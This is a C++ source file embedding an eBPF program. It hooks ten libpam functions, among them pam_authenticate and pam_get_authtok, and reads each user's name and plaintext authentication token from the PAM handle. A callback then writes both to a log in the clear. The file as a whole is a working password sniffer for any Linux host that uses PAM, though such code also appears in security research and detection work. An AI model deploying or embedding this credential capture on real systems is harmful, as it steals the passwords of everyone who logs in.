#include "pam_task.h"

#include <log4cplus/logger.h>
#include <log4cplus/loggingmacros.h>

#include <string>
#include <thread>
#include <vector>

#include "../bpf_task.h"
#include "../path.h"

static const std::string BPF = R"(
#include <uapi/linux/ptrace.h>
typedef struct {
  int pid;
  char comm[16];
  int cpu;
  char pam_func[64];
  char user[64];
  char authtok[64];
} pam_event_t; 

BPF_PERF_OUTPUT(events);

typedef struct
{
  char *authtok;
  unsigned caller_is;
  void *pam_conversation;
  char *oldauthtok;
  char *prompt; /* for use by pam_get_user() */
  char *service_name;
  char *user;
  char *rhost;
  char *ruser;
  char *tty;
  char *xdisplay;
  char *authtok_type; /* PAM_AUTHTOK_TYPE */
  void *data;
  void *env; /* structure to maintain environment list */
} pam_handle_t;

int after_pam_open_session(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_open_session";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}

int after_pam_close_session(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_close_session";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}

int after_pam_vprompt(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_vprompt";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}

int after_pam_get_item(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_get_item";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}

int after_pam_setcred(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_setcred";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}

int after_pam_start(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_start";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}

int after_pam_acct_mgmt(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_acct_mgmt";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}

int after_pam_get_user(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_get_user";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}

int after_pam_end(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_end";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}

int after_pam_authenticate(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_authenticate";                        
      bpf_probe_read_str(event.pam_func, 64, func_name);       
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}


int after_pam_get_authtok(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      char func_name[] = "pam_get_authtok";
      bpf_probe_read_str(event.pam_func, 64, func_name);
      bpf_probe_read_str(event.user, 64, phandle->user);
      bpf_probe_read_str(event.authtok, 64, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}
)";

static void callback(void* cb_cookie, void* data, int size) {
  pam_event_t* event = static_cast<pam_event_t*>(data);
  log4cplus::Logger logger = log4cplus::Logger::getInstance("default");
  LOG4CPLUS_INFO_FMT(logger, "[%s] user: %s, authtok: %s", event->pam_func,
                     event->user, event->authtok);
}

BPFTask<pam_event_t>* get_pam_task() {
  BPFTask<pam_event_t>* e = new BPFTask<pam_event_t>(BPF, "events", callback);
  std::vector<std::string> attach_uprobes{
      "pam_open_session", "pam_close_session", "pam_get_authtok",
      "pam_authenticate", "pam_start",         "pam_end",
      "pam_get_user",     "pam_acct_mgmt",     "pam_get_item",
      "pam_setcred",
  };
  for (auto func : attach_uprobes) {
    auto ret =
        e->attach_uprobe(PATH_PAM, func, "after_" + func, 0, BPF_PROBE_RETURN);
    if (ret.code() != 0) {
      delete e;
      return nullptr;
    }
  }
  return e;
}
